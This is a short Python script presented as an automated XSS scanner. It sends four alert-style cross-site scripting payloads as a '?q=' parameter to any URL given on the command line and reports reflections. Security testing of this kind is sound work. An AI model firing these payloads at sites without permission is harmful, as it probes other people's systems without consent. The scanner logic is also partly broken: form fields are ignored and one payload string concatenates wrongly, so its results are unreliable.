import requests
import re
import argparse
from urllib.parse import urljoin

# XSS Payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "'""><script>alert('XSS')</script>"
]

def scan_xss(url):
    print(f"Scanning {url} for XSS vulnerabilities...")
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            forms = re.findall(r'<form.*?>', response.text, re.IGNORECASE)
            if forms:
                print(f"[+] Found {len(forms)} forms in {url}")
                for payload in XSS_PAYLOADS:
                    for form in forms:
                        test_url = urljoin(url, f"?q={payload}")
                        res = requests.get(test_url)
                        if payload in res.text:
                            print(f"[!] XSS Detected at {test_url}")
                            break
            else:
                print("[-] No forms found. Testing URL params...")
                for payload in XSS_PAYLOADS:
                    test_url = urljoin(url, f"?q={payload}")
                    res = requests.get(test_url)
                    if payload in res.text:
                        print(f"[!] XSS Detected at {test_url}")
                        break
                else:
                    print("[-] No XSS found.")
        else:
            print("[-] Could not access the website.")
    except requests.RequestException as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Automated XSS Scanner")
    parser.add_argument("url", help="Target URL to scan")
    args = parser.parse_args()
    scan_xss(args.url)
